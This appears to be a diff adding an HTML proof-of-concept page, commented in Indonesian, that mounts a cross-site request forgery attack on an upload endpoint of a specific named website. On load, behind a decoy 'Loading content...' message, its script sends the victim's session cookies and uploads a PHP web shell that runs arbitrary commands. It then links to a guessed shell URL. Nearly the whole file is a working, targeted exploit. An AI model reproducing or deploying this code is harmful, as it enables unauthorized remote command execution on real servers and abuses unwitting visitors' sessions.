@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Upload POC</title>
+</head>
+<body>
+    <h2>Loading content...</h2>
+    <p>Please wait.</p>
+
+    <!-- 1. FORM STANDARD (auto-submit dengan JS) -->
+    <form id="csrfForm" action="https://daabjr.com/panel/pages/upload-file.php" method="POST" enctype="multipart/form-data" style="display:none;">
+        <!-- Nama field file harus sama dengan form asli (ganti 'fileToUpload' jika berbeda) -->
+        <input type="file" name="fileToUpload" id="fileInput" />
+        
+        <!-- Parameter CSRF token (jika ada, copy dari halaman asli) -->
+        <!-- <input type="hidden" name="csrf_token" value="dummy_token_value" /> -->
+        
+        <!-- Tombol submit (opsional) -->
+        <input type="submit" value="Upload" />
+    </form>
+
+    <!-- 2. ATAU PAKAI JAVASCRIPT FETCH (lebih modern) -->
+    <script>
+        // --- KONFIGURASI (ubah sesuai hasil analisis Anda) ---
+        const TARGET_URL = 'https://daabjr.com/panel/pages/upload-file.php';
+        // Buat file shell (file.php dengan isi <?php system($_GET['cmd']); ?>)
+        const SHELL_CONTENT = '<?php system($_GET["cmd"]); ?>';
+        const SHELL_FILENAME = 'shelltoso.php';
+        
+        // Mimetype gambar (bisa juga 'application/x-httpd-php')
+        const MIME_TYPE = 'image/jpeg'; 
+        // ----------------------------------------------------
+
+        async function uploadShell() {
+            // Buat FormData object
+            const formData = new FormData();
+            
+            // Buat file dari string
+            const blob = new Blob([SHELL_CONTENT], { type: MIME_TYPE });
+            formData.append('fileToUpload', blob, SHELL_FILENAME);
+            
+            // Append parameter lain jika ada (contoh: submit button)
+            formData.append('submit', 'Upload');
+            
+            // Jika ada CSRF token, append di sini
+            // formData.append('csrf_token', 'nilai_token_dari_form_asli');
+            
+            try {
+                // Kirim request dengan credentials (cookies otomatis terbawa)
+                const response = await fetch(TARGET_URL, {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'include', // PENTING! Membawa cookie session korban
+                });
+                
+                const text = await response.text();
+                console.log('Server response:', text);
+                
+                // Coba tebak lokasi shell yang terupload (biasanya /uploads/csrf_shell.php)
+                const shellUrl = 'https://daabjr.com/panel/uploads/csrf_shell.php?cmd=id';
+                document.body.innerHTML = `<pre>Response: ${text}\n\nCoba akses shell di: <a href="${shellUrl}" target="_blank">${shellUrl}</a></pre>`;
+            } catch (err) {
+                document.body.innerHTML = `<pre>Error: ${err.message}</pre>`;
+            }
+        }
+        
+        // Jalankan upload setelah halaman dimuat
+        window.onload = uploadShell;
+    </script>
+</body>
+</html>
